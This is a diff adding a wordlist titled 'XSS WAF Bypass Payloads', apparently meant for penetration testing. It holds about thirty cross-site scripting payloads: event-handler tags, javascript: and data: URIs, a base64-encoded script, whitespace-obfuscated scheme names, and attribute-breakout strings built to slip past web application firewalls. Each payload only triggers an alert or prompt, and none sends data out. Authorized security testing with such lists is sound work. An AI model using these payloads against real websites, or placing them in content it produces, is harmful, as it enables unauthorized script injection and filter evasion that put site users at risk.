@@ -1,0 +1,29 @@
+# XSS WAF Bypass Payloads
+<svg/onload=alert(1)>
+<svg/onload=(confirm(1))>
+<svg/onload=(((confirm(1))))>
+<img src=x onerror=alert(1)>
+<img src=x onerror=confirm(1)>
+<body onload=alert(1)>
+<input/onfocus=alert(1) autofocus>
+<input/onfocus=alert`1` autofocus>
+<input/onfocus=prompt`0` autofocus>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<script>alert(1)//
+<script>alert(1)<!--
+<script>alert(1)%0A-->
+<script src=data:,alert(1)>
+<svg><script xlink:href=data:,alert(1)>
+'';!--"<XSS>=&{()}
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+javascript:alert(1)
+javascript://alert(1)
+data:text/html,<script>alert(1)</script>
